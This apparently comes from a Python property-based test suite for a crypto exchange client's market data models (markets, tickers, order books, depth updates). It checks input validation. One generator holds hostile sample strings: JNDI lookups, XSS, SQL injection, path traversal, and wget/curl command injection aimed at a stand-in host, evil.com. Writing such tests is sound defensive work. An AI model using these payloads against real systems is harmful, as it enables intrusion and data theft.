"""Property-based tests for Backpack raw market data models.

These tests validate critical market data models that process external trading market information.
The models tested here are essential for market discovery, price feeds, and order book operations.

SECURITY CRITICAL: These raw models protect against:
- Malicious market data that could manipulate price calculations
- Financial precision errors in tick sizes and price increments
- Buffer overflow attacks through oversized market identifiers
- Injection attacks through market symbols and metadata
- Order book manipulation through malformed bid/ask data
- Ticker manipulation that could affect trading decisions

Property testing ensures comprehensive coverage of market data edge cases and adversarial inputs.
"""

from decimal import Decimal
from typing import Any, cast

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.backpack.models.bp_raw_market import (
    BackpackRawDepthUpdateEvent,
    BackpackRawMarketResponse,
    BackpackRawOrderBook,
    BackpackRawOrderBookFilters,
    BackpackRawPriceFilter,
    BackpackRawQuantityFilter,
    BackpackRawTickerResponse,
)
from cyberdelta.apis.exceptions.field_validation import DecimalFiniteError
from cyberdelta.apis.exceptions.parsing import SequenceLengthError, StructureTypeError
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import (
    EmptyStringError,
)


# =============================================================================
# HYPOTHESIS STRATEGIES FOR MARKET DATA MODEL TESTING
# =============================================================================


def market_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for market financial fields.

    Returns:
        A Hypothesis strategy for decimal strings used in market data.
    """
    return st.one_of([
        # Market price/volume amounts
        st.decimals(min_value=Decimal(0), max_value=Decimal(10000000), places=8).map(str),
        st.decimals(min_value=Decimal(0), max_value=Decimal(1000000), places=6).map(str),
        # Common market values
        st.just("0"),
        st.just("0.0"),
        st.just("0.01"),  # Minimum tick
        st.just("1000.50"),  # Mid-range price
        st.just("0.00000001"),  # Minimum precision
        st.just("999999.99999999"),  # Large price
        # Scientific notation (valid for decimal parsing)
        st.just("1e6"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def market_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid market symbol strings.

    Returns:
        A Hypothesis strategy for valid market symbol strings.
    """
    return st.one_of([
        # Common trading pairs
        st.sampled_from(["BTC_USDC", "ETH_USDC", "SOL_USDC", "AVAX_USDC", "ARB_USDC"]),
        # Valid symbol formats
        st.text(
            min_size=3,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
            ),
        ).filter(lambda x: "_" in x and len(x.encode("utf-8")) <= 64),
        # Edge cases
        st.text(min_size=1, max_size=64).filter(
            lambda x: x.strip() and len(x.encode("utf-8")) <= 64
        ),
    ])


def asset_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid asset symbol strings.

    Returns:
        A Hypothesis strategy for valid asset symbol strings.
    """
    return st.one_of([
        # Common assets
        st.sampled_from(["BTC", "ETH", "SOL", "USDC", "USDT", "AVAX", "ARB"]),
        # Valid asset formats
        st.text(
            min_size=2, max_size=64, alphabet=st.characters(whitelist_categories=["Lu", "Ll", "Nd"])
        ),
        # Edge cases
        st.text(min_size=1, max_size=64).filter(
            lambda x: x.strip() and len(x.encode("utf-8")) <= 64
        ),
    ])


def market_type_strategy() -> SearchStrategy[str]:
    """Generate valid market type strings.

    Returns:
        A Hypothesis strategy for valid market type strings.
    """
    return st.one_of([
        st.sampled_from(["Spot", "Perpetual", "Future"]),
        st.text(min_size=1, max_size=64).filter(lambda x: x.strip()),
    ])


def order_book_state_strategy() -> SearchStrategy[str]:
    """Generate valid order book state strings.

    Returns:
        A Hypothesis strategy for valid order book state strings.
    """
    return st.one_of([
        st.sampled_from(["NORMAL", "HALTED", "SUSPENDED", "MAINTENANCE"]),
        st.text(min_size=1, max_size=64).filter(lambda x: x.strip()),
    ])


def timestamp_strategy() -> SearchStrategy[int | float | str | None]:
    """Generate valid timestamp values.

    Returns:
        A Hypothesis strategy for valid timestamp values.
    """
    return st.one_of([
        # Unix timestamps (milliseconds)
        st.integers(min_value=1000000000000, max_value=2000000000000),
        # Unix timestamps (seconds)
        st.integers(min_value=1000000000, max_value=2000000000),
        # Float timestamps
        st.floats(
            min_value=1000000000.0, max_value=2000000000.0, allow_nan=False, allow_infinity=False
        ),
        # ISO format strings
        st.just("2023-03-15T12:00:00Z"),
        st.just("2024-01-01T00:00:00.000Z"),
        # String timestamps
        st.integers(min_value=1000000000000, max_value=2000000000000).map(str),
        # None for optional fields
        st.none(),
    ])


@st.composite
def price_filter_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid price filter data.

    Returns:
        Dictionary containing price filter parameters including minPrice, maxPrice, and tickSize.
    """
    return {
        "minPrice": draw(market_decimal_strategy()),
        "maxPrice": draw(st.one_of([market_decimal_strategy(), st.none()])),
        "tickSize": draw(market_decimal_strategy()),
    }


@st.composite
def quantity_filter_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid quantity filter data.

    Returns:
        Dictionary containing quantity filter parameters.
    """
    return {
        "minQuantity": draw(market_decimal_strategy()),
        "maxQuantity": draw(st.one_of([market_decimal_strategy(), st.none()])),
        "stepSize": draw(market_decimal_strategy()),
    }


@st.composite
def order_book_filters_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid order book filters data.

    Returns:
        Dictionary containing order book filters with price and quantity filter data.
    """
    return {
        "price": draw(price_filter_data()),
        "quantity": draw(quantity_filter_data()),
    }


@st.composite
def valid_market_response_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid market response data structure.

    Returns:
        Dictionary containing complete market response data with symbol, filters, and metadata.
    """
    return {
        "symbol": draw(market_symbol_strategy()),
        "baseSymbol": draw(asset_symbol_strategy()),
        "quoteSymbol": draw(asset_symbol_strategy()),
        "marketType": draw(market_type_strategy()),
        "filters": draw(order_book_filters_data()),
        "orderBookState": draw(order_book_state_strategy()),
        "createdAt": draw(st.text(min_size=5, max_size=64)),  # Timestamp string
    }


@st.composite
def valid_ticker_response_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid ticker response data structure.

    Returns:
        Dictionary containing complete ticker data with prices, volume, and market statistics.
    """
    return {
        "symbol": draw(market_symbol_strategy()),
        "firstPrice": draw(market_decimal_strategy()),
        "lastPrice": draw(market_decimal_strategy()),
        "high": draw(market_decimal_strategy()),
        "low": draw(market_decimal_strategy()),
        "priceChange": draw(market_decimal_strategy()),
        "priceChangePercent": draw(market_decimal_strategy()),
        "volume": draw(market_decimal_strategy()),
        "quoteVolume": draw(market_decimal_strategy()),
        "trades": draw(st.text(min_size=1, max_size=64)),
    }


@st.composite
def valid_ticker_event_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid ticker event data structure.

    Returns:
        Dictionary containing ticker event data with abbreviated field names and values.
    """
    return {
        "s": draw(market_symbol_strategy()),
        "c": draw(market_decimal_strategy()),  # last_price
        "h": draw(market_decimal_strategy()),  # high
        "l": draw(market_decimal_strategy()),  # low
        "o": draw(st.one_of([market_decimal_strategy(), st.none()])),  # open_price
        "v": draw(market_decimal_strategy()),  # volume
        "V": draw(market_decimal_strategy()),  # quote_volume
        "priceChangePercent": draw(st.one_of([market_decimal_strategy(), st.none()])),
        "e": draw(st.one_of([st.text(min_size=1, max_size=32), st.none()])),  # event_type
        "E": draw(timestamp_strategy()),  # event_time
    }


@st.composite
def order_book_level_data(draw: st.DrawFn) -> list[Any]:
    """Generate valid order book level data (price, quantity tuple).

    Returns:
        List containing price and quantity values representing an order book level.
    """
    return [
        draw(market_decimal_strategy()),  # price
        draw(market_decimal_strategy()),  # quantity
    ]


@st.composite
def valid_order_book_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid order book data structure.

    Returns:
        Dictionary containing order book data with bids, asks, and timestamps.
    """
    return {
        "bids": draw(st.lists(order_book_level_data(), min_size=0, max_size=10)),
        "asks": draw(st.lists(order_book_level_data(), min_size=0, max_size=10)),
        "lastUpdateId": draw(st.text(min_size=1, max_size=64)),
        "timestamp": draw(timestamp_strategy()),
    }


@st.composite
def valid_depth_update_event_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid depth update event data structure.

    Returns:
        Dictionary containing depth update event data with bids, asks, and update IDs.
    """
    return {
        "b": draw(
            st.one_of([st.lists(order_book_level_data(), min_size=0, max_size=5), st.none()])
        ),
        "a": draw(
            st.one_of([st.lists(order_book_level_data(), min_size=0, max_size=5), st.none()])
        ),
        "U": draw(st.text(min_size=1, max_size=64)),  # first_update_id
        "u": draw(st.text(min_size=1, max_size=64)),  # last_update_id
        "e": draw(st.one_of([st.text(min_size=1, max_size=32), st.none()])),  # event_type
        "E": draw(timestamp_strategy()),  # event_time
        "T": draw(timestamp_strategy()),  # engine_time
    }


def malicious_market_strategy() -> SearchStrategy[str]:
    """Generate malicious strings for market security testing.

    Returns:
        A Hypothesis strategy for malicious values to test security boundaries.
    """
    return st.one_of([
        # Financial manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-prices}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('market-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE markets;--"),
        st.just("1' UNION SELECT * FROM prices--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("M" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.markets.find(); //"),
        # JSON injection
        st.just('{"$where": "this.price > 1000000"}'),
        # Ticker manipulation
        st.just("BTC_USDC'; UPDATE tickers SET price=0;--"),
    ])


def invalid_market_type_strategy() -> SearchStrategy[object]:
    """Generate invalid types for market field validation testing.

    Returns:
        A Hypothesis strategy for invalid type values.
    """
    return st.one_of([
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
        # Complex nested structures
        st.lists(st.dictionaries(st.text(), st.integers())),
        st.dictionaries(st.text(), st.lists(st.text())),
    ])


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW MARKET RESPONSE MODEL
# =============================================================================


class TestBackpackRawMarketResponseProperties:
    """Property-based tests for BackpackRawMarketResponse validation and security."""

    @given(market_data=valid_market_response_data())
    def test_market_validation_success_properties(self, market_data: dict[str, Any]) -> None:
        """Property: Valid market data should always create valid objects."""
        # Skip invalid nested filter data
        try:
            # Check price filter decimals
            price_filter = market_data["filters"]["price"]
            tick_size_val = Decimal(price_filter["tickSize"])
            min_price_val = Decimal(price_filter["minPrice"])
            assume(tick_size_val.is_finite() and min_price_val.is_finite())

            if price_filter["maxPrice"] is not None:
                max_price_val = Decimal(price_filter["maxPrice"])
                assume(max_price_val.is_finite())

            # Check quantity filter decimals
            quantity_filter = market_data["filters"]["quantity"]
            step_size_val = Decimal(quantity_filter["stepSize"])
            min_quantity_val = Decimal(quantity_filter["minQuantity"])
            assume(step_size_val.is_finite() and min_quantity_val.is_finite())

            if quantity_filter["maxQuantity"] is not None:
                max_quantity_val = Decimal(quantity_filter["maxQuantity"])
                assume(max_quantity_val.is_finite())

        except (ValueError, TypeError, KeyError):
            assume(False)

        # Skip empty or invalid strings
        assume(market_data["symbol"].strip())
        assume(market_data["baseSymbol"].strip())
        assume(market_data["quoteSymbol"].strip())
        assume(market_data["marketType"].strip())
        assume(market_data["orderBookState"].strip())

        obj = BackpackRawMarketResponse.model_validate(market_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawMarketResponse)

        # Property: All fields should be preserved
        assert obj.symbol == market_data["symbol"]
        assert obj.base_symbol == market_data["baseSymbol"]
        assert obj.quote_symbol == market_data["quoteSymbol"]
        assert obj.market_type == market_data["marketType"]
        assert obj.order_book_state == market_data["orderBookState"]

        # Property: Nested filters should be properly typed
        assert isinstance(obj.filters, BackpackRawOrderBookFilters)
        assert isinstance(obj.filters.price, BackpackRawPriceFilter)
        assert isinstance(obj.filters.quantity, BackpackRawQuantityFilter)

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "ignore"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from([
            "symbol",
            "baseSymbol",
            "quoteSymbol",
            "marketType",
            "orderBookState",
        ]),
        malicious_value=malicious_market_strategy(),
    )
    def test_market_security_boundary_properties(
        self, field_name: str, malicious_value: str
    ) -> None:
        """Property: Market model should reject malicious inputs safely."""
        base_data: dict[str, object] = {
            "symbol": "BTC_USDC",
            "baseSymbol": "BTC",
            "quoteSymbol": "USDC",
            "marketType": "Spot",
            "filters": {
                "price": {"minPrice": "0.01", "maxPrice": "1000000.0", "tickSize": "0.01"},
                "quantity": {
                    "minQuantity": "0.0001",
                    "maxQuantity": "1000.0",
                    "stepSize": "0.0001",
                },
            },
            "orderBookState": "NORMAL",
            "createdAt": "2024-01-01T00:00:00.000Z",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawMarketResponse.model_validate(base_data)

    @given(
        field_name=st.sampled_from(["symbol", "baseSymbol", "quoteSymbol", "filters"]),
        invalid_value=invalid_market_type_strategy(),
    )
    def test_market_type_safety_properties(self, field_name: str, invalid_value: object) -> None:
        """Property: Market model should enforce strict type safety."""
        base_data: dict[str, object] = {
            "symbol": "BTC_USDC",
            "baseSymbol": "BTC",
            "quoteSymbol": "USDC",
            "marketType": "Spot",
            "filters": {
                "price": {"minPrice": "0.01", "maxPrice": "1000000.0", "tickSize": "0.01"},
                "quantity": {
                    "minQuantity": "0.0001",
                    "maxQuantity": "1000.0",
                    "stepSize": "0.0001",
                },
            },
            "orderBookState": "NORMAL",
            "createdAt": "2024-01-01T00:00:00.000Z",
        }
        base_data[field_name] = invalid_value

        # Property: Wrong types should be rejected
        with pytest.raises((ValidationError, TypeError)):
            BackpackRawMarketResponse.model_validate(base_data)

    @given(
        filter_field=st.sampled_from(["tickSize", "minPrice", "stepSize", "minQuantity"]),
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0.01"),
            st.just("1000.50"),
            st.just("1e6"),
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
        ]),
    )
    def test_market_filter_decimal_validation_properties(
        self, filter_field: str, decimal_value: str
    ) -> None:
        """Property: Market filter decimal fields should validate properly."""
        market_data = {
            "symbol": "BTC_USDC",
            "baseSymbol": "BTC",
            "quoteSymbol": "USDC",
            "marketType": "Spot",
            "filters": {
                "price": {"minPrice": "0.01", "maxPrice": "1000000.0", "tickSize": "0.01"},
                "quantity": {
                    "minQuantity": "0.0001",
                    "maxQuantity": "1000.0",
                    "stepSize": "0.0001",
                },
            },
            "orderBookState": "NORMAL",
            "createdAt": "2024-01-01T00:00:00.000Z",
        }

        # Update the appropriate filter field
        # Cast needed because hypothesis strategy types are too broad

        filters = cast(dict[str, Any], market_data["filters"])
        price_filters = cast(dict[str, Any], filters["price"])
        quantity_filters = cast(dict[str, Any], filters["quantity"])

        field_key = str(filter_field)
        if field_key in ["tickSize", "minPrice"]:
            price_filters[field_key] = decimal_value
        else:
            quantity_filters[field_key] = decimal_value

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()

            if is_finite and not is_empty:
                # Property: Valid finite decimals should be accepted
                obj = BackpackRawMarketResponse.model_validate(market_data)
                assert isinstance(obj, BackpackRawMarketResponse)
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, DecimalFiniteError)):
                    BackpackRawMarketResponse.model_validate(market_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                BackpackRawMarketResponse.model_validate(market_data)


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW TICKER RESPONSE MODEL
# =============================================================================


class TestBackpackRawTickerResponseProperties:
    """Property-based tests for BackpackRawTickerResponse validation and security."""

    @given(ticker_data=valid_ticker_response_data())
    def test_ticker_validation_success_properties(self, ticker_data: dict[str, Any]) -> None:
        """Property: Valid ticker data should always create valid objects."""
        # Skip invalid decimal values
        try:
            decimal_fields = [
                "firstPrice",
                "lastPrice",
                "high",
                "low",
                "priceChange",
                "priceChangePercent",
                "volume",
                "quoteVolume",
            ]
            for field in decimal_fields:
                decimal_val = Decimal(ticker_data[field])
                assume(decimal_val.is_finite())
        except (ValueError, TypeError):
            assume(False)

        # Skip empty strings
        assume(ticker_data["symbol"].strip())
        assume(ticker_data["trades"].strip())

        obj = BackpackRawTickerResponse.model_validate(ticker_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawTickerResponse)

        # Property: All fields should be preserved
        assert obj.symbol == ticker_data["symbol"]
        assert obj.first_price == ticker_data["firstPrice"]
        assert obj.last_price == ticker_data["lastPrice"]
        assert obj.volume == ticker_data["volume"]
        assert obj.trades == ticker_data["trades"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["symbol", "firstPrice", "lastPrice", "volume"]),
        malicious_value=malicious_market_strategy(),
    )
    def test_ticker_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: Ticker model should reject malicious inputs safely."""
        base_data: dict[str, object] = {
            "symbol": "BTC_USDC",
            "firstPrice": "50000.00",
            "lastPrice": "50250.50",
            "high": "51000.00",
            "low": "49500.00",
            "priceChange": "250.50",
            "priceChangePercent": "0.5",
            "volume": "1000.5",
            "quoteVolume": "50125000.0",
            "trades": "1500",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, DecimalFiniteError)):
            BackpackRawTickerResponse.model_validate(base_data)


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW ORDER BOOK MODEL
# =============================================================================


class TestBackpackRawOrderBookProperties:
    """Property-based tests for BackpackRawOrderBook validation and security."""

    @given(order_book_data=valid_order_book_data())
    def test_order_book_validation_success_properties(
        self, order_book_data: dict[str, Any]
    ) -> None:
        """Property: Valid order book data should always create valid objects."""
        # Skip invalid decimal values in bid/ask levels
        try:
            for levels in [order_book_data["bids"], order_book_data["asks"]]:
                for level in levels:
                    if len(level) == 2:
                        price_val = Decimal(level[0])
                        quantity_val = Decimal(level[1])
                        assume(price_val.is_finite() and quantity_val.is_finite())
                        assume(price_val >= 0 and quantity_val >= 0)  # Non-negative constraint
        except (ValueError, TypeError, IndexError):
            assume(False)

        # Skip empty required strings
        assume(order_book_data["lastUpdateId"].strip())

        obj = BackpackRawOrderBook.model_validate(order_book_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawOrderBook)

        # Property: Bids and asks should be lists of tuples
        assert isinstance(obj.bids, list)
        assert isinstance(obj.asks, list)

        # Property: Each level should be a tuple of two strings
        for bid in obj.bids:
            assert isinstance(bid, tuple)
            assert len(bid) == 2
            assert isinstance(bid[0], str)  # price
            assert isinstance(bid[1], str)  # quantity

        for ask in obj.asks:
            assert isinstance(ask, tuple)
            assert len(ask) == 2
            assert isinstance(ask[0], str)  # price
            assert isinstance(ask[1], str)  # quantity

    @given(
        invalid_level_data=st.one_of([
            st.just([]),  # Empty level
            st.just(["price"]),  # Missing quantity
            st.just(["price", "qty", "extra"]),  # Too many elements
            st.just([123, 456]),  # Wrong types
            st.just("not_a_list"),  # Not a list
            st.none(),  # None
        ])
    )
    def test_order_book_level_validation_properties(self, invalid_level_data: object) -> None:
        """Property: Order book levels should be validated properly."""
        order_book_data = {
            "bids": [invalid_level_data],
            "asks": [["100.0", "1.0"]],
            "lastUpdateId": "12345",
            "timestamp": 1678886400000,
        }

        # Property: Invalid level data should be rejected
        with pytest.raises((ValidationError, StructureTypeError, SequenceLengthError, TypeError)):
            BackpackRawOrderBook.model_validate(order_book_data)


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW DEPTH UPDATE EVENT MODEL
# =============================================================================


class TestBackpackRawDepthUpdateEventProperties:
    """Property-based tests for BackpackRawDepthUpdateEvent validation and security."""

    @given(depth_data=valid_depth_update_event_data())
    def test_depth_update_validation_success_properties(self, depth_data: dict[str, Any]) -> None:
        """Property: Valid depth update data should always create valid objects."""
        # Skip invalid decimal values in bid/ask levels
        try:
            for field_key in ["b", "a"]:
                levels = depth_data[field_key]
                if levels is not None:
                    for level in levels:
                        if len(level) == 2:
                            price_val = Decimal(level[0])
                            quantity_val = Decimal(level[1])
                            assume(price_val.is_finite() and quantity_val.is_finite())
        except (ValueError, TypeError, IndexError):
            assume(False)

        # Skip empty required strings
        assume(depth_data["U"].strip())
        assume(depth_data["u"].strip())

        obj = BackpackRawDepthUpdateEvent.model_validate(depth_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawDepthUpdateEvent)

        # Property: Update IDs should be preserved
        assert obj.first_update_id == depth_data["U"]
        assert obj.last_update_id == depth_data["u"]

        # Property: Optional bids/asks should handle None correctly
        if depth_data["b"] is not None:
            assert obj.bids is not None
            assert isinstance(obj.bids, list)
        else:
            assert obj.bids is None

        if depth_data["a"] is not None:
            assert obj.asks is not None
            assert isinstance(obj.asks, list)
        else:
            assert obj.asks is None

    @given(
        field_name=st.sampled_from(["U", "u", "b", "a"]),
        malicious_value=malicious_market_strategy(),
    )
    def test_depth_update_security_boundary_properties(
        self, field_name: str, malicious_value: str
    ) -> None:
        """Property: Depth update model should reject malicious inputs safely."""
        base_data: dict[str, list[list[str]] | str | int] = {
            "b": [["100.0", "1.0"]],
            "a": [["101.0", "1.0"]],
            "U": "12345",
            "u": "12346",
            "e": "depthUpdate",
            "E": 1678886400000,
            "T": 1678886400100,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, StructureTypeError)):
            BackpackRawDepthUpdateEvent.model_validate(base_data)


# =============================================================================
# INTEGRATION PROPERTY TESTS
# =============================================================================


class TestBackpackRawMarketIntegrationProperties:
    """Integration property tests for all market models."""

    @given(
        market_data=valid_market_response_data(),
        ticker_data=valid_ticker_response_data(),
        order_book_data=valid_order_book_data(),
    )
    def test_market_models_consistency_properties(
        self,
        market_data: dict[str, Any],
        ticker_data: dict[str, Any],
        order_book_data: dict[str, Any],
    ) -> None:
        """Property: All market models should have consistent validation behavior."""
        # Filter to valid inputs only
        try:
            # Validate market decimals
            price_filter = market_data["filters"]["price"]
            Decimal(price_filter["tickSize"])

            # Validate ticker decimals
            Decimal(ticker_data["firstPrice"])

            # Validate order book levels
            for levels in [order_book_data["bids"], order_book_data["asks"]]:
                for level in levels:
                    if len(level) == 2:
                        Decimal(level[0])
                        Decimal(level[1])

        except (ValueError, TypeError, KeyError):
            assume(False)

        assume(market_data["symbol"].strip())
        assume(ticker_data["symbol"].strip())
        assume(order_book_data["lastUpdateId"].strip())

        # Property: All models should validate successfully with valid data
        market_obj = BackpackRawMarketResponse.model_validate(market_data)
        ticker_obj = BackpackRawTickerResponse.model_validate(ticker_data)
        order_book_obj = BackpackRawOrderBook.model_validate(order_book_data)

        # Property: All should have consistent model configuration
        assert market_obj.model_config.get("frozen") is True
        assert ticker_obj.model_config.get("frozen") is True
        assert order_book_obj.model_config.get("frozen") is True

    @given(
        malicious_data=st.dictionaries(
            st.sampled_from(["symbol", "firstPrice", "lastPrice", "tickSize", "U", "u"]),
            malicious_market_strategy(),
        )
    )
    def test_market_models_security_boundary_properties(
        self, malicious_data: dict[str, Any]
    ) -> None:
        """Property: All market models should consistently reject malicious inputs."""
        # Try to validate as market response if it has market fields
        if "symbol" in malicious_data or "tickSize" in malicious_data:
            market_data = {
                "symbol": malicious_data.get("symbol", "BTC_USDC"),
                "baseSymbol": "BTC",
                "quoteSymbol": "USDC",
                "marketType": "Spot",
                "filters": {
                    "price": {
                        "minPrice": "0.01",
                        "maxPrice": "1000000.0",
                        "tickSize": malicious_data.get("tickSize", "0.01"),
                    },
                    "quantity": {
                        "minQuantity": "0.0001",
                        "maxQuantity": "1000.0",
                        "stepSize": "0.0001",
                    },
                },
                "orderBookState": "NORMAL",
                "createdAt": "2024-01-01T00:00:00.000Z",
            }

            # Property: Malicious market data should be rejected
            with pytest.raises((ValidationError, TypeError, EmptyStringError, DecimalFiniteError)):
                BackpackRawMarketResponse.model_validate(market_data)

        # Try to validate as ticker if it has ticker fields
        if "firstPrice" in malicious_data or "lastPrice" in malicious_data:
            ticker_data = {
                "symbol": malicious_data.get("symbol", "BTC_USDC"),
                "firstPrice": malicious_data.get("firstPrice", "50000.00"),
                "lastPrice": malicious_data.get("lastPrice", "50250.50"),
                "high": "51000.00",
                "low": "49500.00",
                "priceChange": "250.50",
                "priceChangePercent": "0.5",
                "volume": "1000.5",
                "quoteVolume": "50125000.0",
                "trades": "1500",
            }

            # Property: Malicious ticker data should be rejected
            with pytest.raises((ValidationError, TypeError, EmptyStringError, DecimalFiniteError)):
                BackpackRawTickerResponse.model_validate(ticker_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_BackpackRawMarketResponse_real_world_example() -> None:
    """Test with real-world market metadata."""
    payload = {
        "symbol": "BTC_USDC",
        "baseSymbol": "BTC",
        "quoteSymbol": "USDC",
        "marketType": "Spot",
        "filters": {
            "price": {"minPrice": "0.01", "maxPrice": "1000000.0", "tickSize": "0.01"},
            "quantity": {"minQuantity": "0.0001", "maxQuantity": "1000.0", "stepSize": "0.0001"},
        },
        "orderBookState": "NORMAL",
        "createdAt": "2024-01-01T00:00:00.000Z",
    }
    obj = BackpackRawMarketResponse.model_validate(payload)
    assert obj.symbol == "BTC_USDC"
    assert obj.base_symbol == "BTC"
    assert obj.quote_symbol == "USDC"
    assert obj.filters.price.tick_size == "0.01"


def test_BackpackRawTickerResponse_real_world_example() -> None:
    """Test with real-world ticker data."""
    payload = {
        "symbol": "ETH_USDC",
        "firstPrice": "1600.00",
        "lastPrice": "1650.50",
        "high": "1680.00",
        "low": "1590.00",
        "priceChange": "50.50",
        "priceChangePercent": "3.16",
        "volume": "25000.5",
        "quoteVolume": "41250000.0",
        "trades": "15000",
    }
    obj = BackpackRawTickerResponse.model_validate(payload)
    assert obj.symbol == "ETH_USDC"
    assert obj.first_price == "1600.00"
    assert obj.last_price == "1650.50"
    assert obj.volume == "25000.5"


def test_BackpackRawOrderBook_real_world_example() -> None:
    """Test with real-world order book data."""
    payload = {
        "bids": [
            ["50000.00", "1.5"],
            ["49999.50", "2.0"],
            ["49999.00", "0.5"],
        ],
        "asks": [
            ["50001.00", "1.0"],
            ["50001.50", "1.5"],
            ["50002.00", "2.0"],
        ],
        "lastUpdateId": "123456789",
        "timestamp": 1678886400000,
    }
    obj = BackpackRawOrderBook.model_validate(payload)
    assert len(obj.bids) == 3
    assert len(obj.asks) == 3
    assert obj.bids[0] == ("50000.00", "1.5")
    assert obj.asks[0] == ("50001.00", "1.0")
